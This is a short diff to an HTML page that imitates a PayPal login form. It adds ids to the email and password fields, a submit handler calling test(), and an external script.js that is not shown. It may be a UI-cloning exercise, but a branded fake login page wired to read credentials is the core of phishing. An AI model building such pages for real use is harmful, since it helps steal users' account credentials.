@@ -9,10 +9,10 @@
     <div class="mainBoxContainer">
       <a class="mainBox" >
         <img class="element1" src="./images/paypallogo-removebg-preview.png" style="height: 40px; width: 38px;">
-        <input class="element2" type="text" placeholder="Email address or mobile number">
-        <input class="element3" type="password" placeholder="Password">
+        <input id="email" class="element2" type="text" placeholder="Email address or mobile number">
+        <input id="password" class="element3" type="password" placeholder="Password">
         <p class="forgottenPassword">Forgotten password?</p>
-        <button class="loginButton">Log In</button>
+        <input type="submit" onclick="test()" class="loginButton" value="Log In">
         <p class="loginSeperator" style="opacity: 0.8;">---------------------------------- or ----------------------------------</p>
         <button class="SignUpButton">Sign Up</button>
       </a>
@@ -24,4 +24,5 @@
       <a class="words">Worldwide</a>
     </div>
   </body>
+  <script src="script.js"></script>
 </html>
